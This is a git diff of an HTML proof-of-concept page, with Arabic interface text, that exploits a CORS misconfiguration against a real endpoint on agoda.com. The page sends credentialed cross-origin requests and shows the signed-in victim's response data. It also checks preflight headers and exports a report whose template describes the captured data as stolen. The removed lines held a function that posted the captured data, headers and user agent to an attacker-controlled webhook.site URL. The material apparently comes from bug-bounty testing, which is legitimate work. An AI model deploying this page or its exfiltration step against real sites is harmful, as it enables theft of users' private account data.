@@ -3,15 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CORS Misconfiguration PoC</title>
+    <title>CORS PoC - GitHub Pages</title>
     <style>
+        * { box-sizing: border-box; }
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            max-width: 800px;
-            margin: 50px auto;
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+            max-width: 1000px;
+            margin: 30px auto;
             padding: 20px;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: #333;
+            min-height: 100vh;
         }
         .container {
             background: white;
@@ -19,256 +20,314 @@
             border-radius: 10px;
             box-shadow: 0 10px 30px rgba(0,0,0,0.3);
         }
-        h1 {
-            color: #667eea;
-            border-bottom: 3px solid #667eea;
-            padding-bottom: 10px;
-        }
-        .info-box {
-            background: #f0f4ff;
+        h1 { color: #667eea; border-bottom: 3px solid #667eea; padding-bottom: 10px; }
+        h3 { color: #555; margin-top: 25px; }
+        .alert {
             padding: 15px;
             border-radius: 5px;
-            margin: 20px 0;
-            border-left: 4px solid #667eea;
+            margin: 15px 0;
+            border-left: 4px solid;
         }
-        .warning {
-            background: #fff3cd;
-            border-left-color: #ffc107;
-            color: #856404;
-        }
-        button {
-            background: #667eea;
-            color: white;
-            border: none;
-            padding: 12px 30px;
-            font-size: 16px;
-            border-radius: 5px;
-            cursor: pointer;
-            margin: 10px 5px;
-            transition: all 0.3s;
-        }
-        button:hover {
-            background: #5568d3;
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
-        }
-        button:disabled {
-            background: #ccc;
-            cursor: not-allowed;
-            transform: none;
-        }
-        #status {
-            margin-top: 20px;
-            padding: 15px;
-            border-radius: 5px;
-            font-weight: bold;
-        }
-        .success {
-            background: #d4edda;
-            color: #155724;
-            border: 1px solid #c3e6cb;
-        }
-        .error {
-            background: #f8d7da;
-            color: #721c24;
-            border: 1px solid #f5c6cb;
-        }
-        .info {
-            background: #d1ecf1;
-            color: #0c5460;
-            border: 1px solid #bee5eb;
-        }
-        pre {
-            background: #2d2d2d;
-            color: #f8f8f2;
-            padding: 15px;
-            border-radius: 5px;
-            overflow-x: auto;
-            max-height: 400px;
-            overflow-y: auto;
-        }
+        .alert-warning { background: #fff3cd; border-color: #ffc107; color: #856404; }
+        .alert-success { background: #d4edda; border-color: #28a745; color: #155724; }
+        .alert-danger { background: #f8d7da; border-color: #dc3545; color: #721c24; }
         .config-section {
             background: #f8f9fa;
             padding: 20px;
             border-radius: 5px;
             margin: 20px 0;
         }
-        input[type="text"] {
+        label { display: block; font-weight: bold; margin-top: 10px; color: #555; }
+        input[type="text"], select, textarea {
             width: 100%;
             padding: 10px;
-            margin: 10px 0;
+            margin: 5px 0 15px 0;
             border: 2px solid #ddd;
             border-radius: 5px;
             font-family: monospace;
+            font-size: 13px;
         }
-        input[type="text"]:focus {
-            outline: none;
-            border-color: #667eea;
+        textarea { min-height: 80px; resize: vertical; }
+        input:focus, select:focus, textarea:focus { outline: none; border-color: #667eea; }
+        button {
+            background: #667eea;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            font-size: 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 5px;
+            transition: all 0.3s;
         }
+        button:hover { background: #5568d3; transform: translateY(-2px); }
+        button.success { background: #28a745; }
+        button.success:hover { background: #218838; }
+        button.danger { background: #dc3545; }
+        button.danger:hover { background: #c82333; }
+        .result-box {
+            background: #1e1e1e;
+            color: #d4d4d4;
+            padding: 15px;
+            border-radius: 5px;
+            max-height: 500px;
+            overflow: auto;
+            font-family: monospace;
+            font-size: 12px;
+            white-space: pre-wrap;
+            word-break: break-all;
+            position: relative;
+        }
+        .copy-btn {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            background: #667eea;
+            padding: 5px 15px;
+            font-size: 12px;
+        }
+        .status-indicator {
+            display: inline-block;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-weight: bold;
+            margin: 10px 0;
+        }
+        .status-success { background: #28a745; color: white; }
+        .status-error { background: #dc3545; color: white; }
+        .status-info { background: #17a2b8; color: white; }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>🔍 CORS Misconfiguration PoC</h1>
         
-        <div class="info-box warning">
-            <strong>⚠️ تحذير أمني:</strong> استخدم هذا الكود فقط على التطبيقات التي لديك إذن رسمي لاختبارها.
+        <div class="alert alert-warning">
+            <strong>⚠️ تحذير:</strong> استخدم هذا الكود فقط على التطبيقات التي لديك إذن رسمي لاختبارها.
         </div>
 
         <div class="config-section">
             <h3>⚙️ الإعدادات</h3>
-            <label><strong>Webhook URL (من webhook.site):</strong></label>
-            <input type="text" id="webhookUrl" placeholder="https://stelemane.github.io/poc/">
             
-            <label><strong>Target URL (النقطة الحساسة المراد اختبارها):</strong></label>
-            <input type="text" id="targetUrl" placeholder="https://www.agoda.com/api/cronos/layout/notification/get" value="https://www.agoda.com/api/cronos/layout/notification/get">
+            <label>🎯 Target URL (النقطة الحساسة المراد اختبارها):</label>
+            <input type="text" id="targetUrl" value="https://www.agoda.com/api/cronos/layout/notification/get">
             
-            <label><strong>HTTP Method:</strong></label>
-            <select id="httpMethod" style="width: 100%; padding: 10px; margin: 10px 0; border: 2px solid #ddd; border-radius: 5px;">
+            <label>📡 HTTP Method:</label>
+            <select id="httpMethod">
                 <option value="GET">GET</option>
                 <option value="POST">POST</option>
             </select>
+
+            <label>📝 Request Body (لـ POST فقط - اختياري):</label>
+            <textarea id="requestBody" placeholder='{"key": "value"}'></textarea>
         </div>
 
         <button onclick="startTest()">🚀 بدء الاختبار</button>
-        <button onclick="clearResults()">🗑️ مسح النتائج</button>
+        <button onclick="testPreflight()" class="success">🔍 اختبار Preflight</button>
+        <button onclick="clearResults()" class="danger">🗑️ مسح النتائج</button>
 
+        <h3>📊 حالة الاختبار:</h3>
         <div id="status"></div>
 
-        <div id="results" style="margin-top: 20px;"></div>
+        <h3>📋 Response Headers:</h3>
+        <div id="headers" class="result-box">في انتظار الاختبار...</div>
+
+        <h3>📦 البيانات المستلمة:</h3>
+        <div style="position: relative;">
+            <button class="copy-btn" onclick="copyResponse()">📋 نسخ</button>
+            <pre id="response" class="result-box">في انتظار الاختبار...</pre>
+        </div>
+
+        <h3>📝 ملاحظات:</h3>
+        <textarea id="notes" placeholder="اكتب ملاحظاتك هنا..."></textarea>
+        <button onclick="exportReport()" class="success">📄 تصدير التقرير</button>
     </div>
 
     <script>
-        function log(message, type = 'info') {
+        function updateStatus(message, type = 'info') {
             const statusDiv = document.getElementById('status');
-            statusDiv.className = type;
-            statusDiv.innerHTML = message;
-        }
-
-        function addToResults(content) {
-            const resultsDiv = document.getElementById('results');
-            resultsDiv.innerHTML += content;
+            statusDiv.innerHTML = `<span class="status-indicator status-${type}">${message}</span>`;
         }
 
         function clearResults() {
-            document.getElementById('results').innerHTML = '';
+            document.getElementById('headers').textContent = 'في انتظار الاختبار...';
+            document.getElementById('response').textContent = 'في انتظار الاختبار...';
             document.getElementById('status').innerHTML = '';
-            document.getElementById('status').className = '';
+            document.getElementById('notes').value = '';
+        }
+
+        function copyResponse() {
+            const responseText = document.getElementById('response').textContent;
+            navigator.clipboard.writeText(responseText).then(() => {
+                alert('✅ تم نسخ البيانات!');
+            });
+        }
+
+        function exportReport() {
+            const targetUrl = document.getElementById('targetUrl').value;
+            const httpMethod = document.getElementById('httpMethod').value;
+            const headers = document.getElementById('headers').textContent;
+            const response = document.getElementById('response').textContent;
+            const notes = document.getElementById('notes').value;
+            const timestamp = new Date().toISOString();
+
+            const report = `
+# CORS Misconfiguration PoC Report
+
+## معلومات الاختبار
+- **التاريخ:** ${timestamp}
+- **Target URL:** ${targetUrl}
+- **HTTP Method:** ${httpMethod}
+- **Origin:** ${window.location.origin}
+
+## Response Headers
+\`\`\`
+${headers}
+\`\`\`
+
+## البيانات المستلمة
+\`\`\`
+${response}
+\`\`\`
+
+## ملاحظات
+${notes}
+
+## خطوات الإثبات
+1. تسجيل الدخول إلى الحساب في ${new URL(targetUrl).origin}
+2. فتح صفحة PoC: ${window.location.href}
+3. الضغط على "بدء الاختبار"
+4. ملاحظة البيانات المسروقة في الصفحة
+
+## الأثر الأمني
+يمكن للمهاجم سرقة بيانات المستخدم الحساسة من خلال صفحة خبيثة.
+
+## التوصية
+1. عدم السماح بأي Origin خارجي
+2. استخدام Whitelist للنطاقات الموثوقة فقط
+3. عدم استخدام Access-Control-Allow-Credentials مع Origin عام
+            `.trim();
+
+            const blob = new Blob([report], { type: 'text/markdown' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `cors-poc-report-${Date.now()}.md`;
+            a.click();
+            URL.revokeObjectURL(url);
+        }
+
+        function testPreflight() {
+            const targetUrl = document.getElementById('targetUrl').value.trim();
+            if (!targetUrl) {
+                updateStatus('❌ الرجاء إدخال Target URL', 'error');
+                return;
+            }
+
+            updateStatus('🔍 جاري اختبار Preflight...', 'info');
+
+            const xhr = new XMLHttpRequest();
+            xhr.open('OPTIONS', targetUrl, true);
+            xhr.setRequestHeader('Access-Control-Request-Method', 'GET');
+            xhr.setRequestHeader('Access-Control-Request-Headers', 'content-type');
+            xhr.setRequestHeader('Origin', window.location.origin);
+
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4) {
+                    const allowOrigin = xhr.getResponseHeader('Access-Control-Allow-Origin');
+                    const allowCredentials = xhr.getResponseHeader('Access-Control-Allow-Credentials');
+
+                    let headersText = `Status: ${xhr.status}\n`;
+                    headersText += `Access-Control-Allow-Origin: ${allowOrigin || '(غير موجود)'}\n`;
+                    headersText += `Access-Control-Allow-Credentials: ${allowCredentials || '(غير موجود)'}\n`;
+                    headersText += `Access-Control-Allow-Methods: ${xhr.getResponseHeader('Access-Control-Allow-Methods') || '(غير موجود)'}\n`;
+                    headersText += `Access-Control-Allow-Headers: ${xhr.getResponseHeader('Access-Control-Allow-Headers') || '(غير موجود)'}`;
+
+                    document.getElementById('headers').textContent = headersText;
+
+                    if (allowOrigin && allowCredentials === 'true') {
+                        updateStatus('✅ CORS مفعل مع Credentials - يمكن استغلال الثغرة!', 'success');
+                    } else if (allowOrigin) {
+                        updateStatus('⚠️ CORS مفعل لكن بدون Credentials', 'info');
+                    } else {
+                        updateStatus('❌ CORS غير مفعل', 'error');
+                    }
+                }
+            };
+
+            xhr.onerror = function() {
+                updateStatus('❌ فشل طلب Preflight', 'error');
+            };
+
+            xhr.send();
         }
 
         async function startTest() {
-            const webhookUrl = document.getElementById('webhookUrl').value.trim();
             const targetUrl = document.getElementById('targetUrl').value.trim();
             const httpMethod = document.getElementById('httpMethod').value;
-
-            if (!webhookUrl) {
-                log('❌ الرجاء إدخال Webhook URL من webhook.site', 'error');
-                return;
-            }
+            const requestBody = document.getElementById('requestBody').value.trim();
 
             if (!targetUrl) {
-                log('❌ الرجاء إدخال Target URL', 'error');
+                updateStatus('❌ الرجاء إدخال Target URL', 'error');
                 return;
             }
 
-            log('🔄 جاري اختبار CORS...', 'info');
+            updateStatus('🔄 جاري اختبار CORS...', 'info');
 
-            const startTime = new Date();
-            const testId = 'test_' + Date.now();
+            const xhr = new XMLHttpRequest();
+            xhr.open(httpMethod, targetUrl, true);
+            xhr.withCredentials = true;
+            xhr.setRequestHeader('Accept', 'application/json');
 
-            try {
-                // محاولة جلب البيانات من الهدف
-                const response = await fetch(targetUrl, {
-                    method: httpMethod,
-                    credentials: 'include', // مهم جداً لإرسال الكوكيز
-                    headers: {
-                        'Accept': 'application/json',
+            if (httpMethod === 'POST') {
+                xhr.setRequestHeader('Content-Type', 'application/json');
+            }
+
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4) {
+                    // عرض Response Headers
+                    const allHeaders = xhr.getAllResponseHeaders();
+                    document.getElementById('headers').textContent = allHeaders || '(لا توجد headers)';
+
+                    if (xhr.status >= 200 && xhr.status < 300) {
+                        const responseText = xhr.responseText;
+                        
+                        // محاولة تنسيق JSON
+                        try {
+                            const parsed = JSON.parse(responseText);
+                            document.getElementById('response').textContent = JSON.stringify(parsed, null, 2);
+                        } catch {
+                            document.getElementById('response').textContent = responseText;
+                        }
+
+                        updateStatus(`✅ نجح الطلب! Status: ${xhr.status}`, 'success');
+                    } else {
+                        document.getElementById('response').textContent = xhr.responseText || '(لا توجد بيانات)';
+                        updateStatus(`⚠️ Status: ${xhr.status}`, 'error');
                     }
-                });
+                }
+            };
 
-                const data = await response.text();
-                const endTime = new Date();
-                const duration = endTime - startTime;
+            xhr.onerror = function() {
+                updateStatus('❌ فشل الطلب - CORS محظور', 'error');
+                document.getElementById('response').textContent = 'فشل الطلب بسبب CORS Policy.\n\nالأسباب المحتملة:\n1. Third-party cookies محظورة\n2. الخادم لا يسمح بـ CORS\n3. Preflight فشل\n\nالحلول:\n- فعّل Third-party cookies في المتصفح\n- استخدم Burp Suite Embedded Browser\n- جرّب endpoint آخر';
+            };
 
-                // عرض النتائج في الصفحة
-                addToResults(`
-                    <h3>✅ تم جلب البيانات بنجاح!</h3>
-                    <p><strong>مدة الطلب:</strong> ${duration}ms</p>
-                    <p><strong>حالة الاستجابة:</strong> ${response.status}</p>
-                    <h4>البيانات المستلمة:</h4>
-                    <pre>${escapeHtml(data)}</pre>
-                `);
+            xhr.timeout = 30000;
+            xhr.ontimeout = function() {
+                updateStatus('⏰ انتهى وقت الطلب', 'error');
+            };
 
-                log('✅ نجح الاختبار! تم إرسال البيانات إلى Webhook', 'success');
-
-                // إرسال البيانات إلى webhook
-                await sendToWebhook(webhookUrl, {
-                    test_id: testId,
-                    timestamp: startTime.toISOString(),
-                    duration_ms: duration,
-                    target_url: targetUrl,
-                    http_method: httpMethod,
-                    response_status: response.status,
-                    response_headers: Object.fromEntries(response.headers.entries()),
-                    response_data: data,
-                    origin: window.location.origin,
-                    user_agent: navigator.userAgent
-                });
-
-            } catch (error) {
-                const endTime = new Date();
-                const duration = endTime - startTime;
-
-                addToResults(`
-                    <h3>❌ فشل الاختبار</h3>
-                    <p><strong>مدة الطلب:</strong> ${duration}ms</p>
-                    <h4>تفاصيل الخطأ:</h4>
-                    <pre>${escapeHtml(error.toString())}</pre>
-                `);
-
-                log('❌ فشل الاختبار - تحقق من التفاصيل أدناه', 'error');
-
-                // إرسال الخطأ إلى webhook
-                await sendToWebhook(webhookUrl, {
-                    test_id: testId,
-                    timestamp: startTime.toISOString(),
-                    duration_ms: duration,
-                    target_url: targetUrl,
-                    http_method: httpMethod,
-                    error: error.toString(),
-                    origin: window.location.origin,
-                    user_agent: navigator.userAgent
-                });
-            }
-        }
-
-        async function sendToWebhook(webhookUrl, data) {
             try {
-                await fetch(webhookUrl, {
-                    method: 'POST',
-                    mode: 'no-cors', // مهم لتجنب مشاكل CORS مع webhook
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(data, null, 2)
-                });
-                console.log('✅ تم إرسال البيانات إلى Webhook');
-            } catch (error) {
-                console.error('❌ فشل إرسال البيانات إلى Webhook:', error);
+                if (httpMethod === 'POST' && requestBody) {
+                    xhr.send(requestBody);
+                } else {
+                    xhr.send();
+                }
+            } catch (e) {
+                updateStatus(`❌ خطأ: ${e.message}`, 'error');
             }
         }
-
-        function escapeHtml(text) {
-            const div = document.createElement('div');
-            div.textContent = text;
-            return div.innerHTML;
-        }
-
-        // عرض معلومات الصفحة عند التحميل
-        window.addEventListener('load', () => {
-            console.log('🔍 CORS PoC Tool Loaded');
-            console.log('Current Origin:', window.location.origin);
-        });
     </script>
 </body>
 </html>
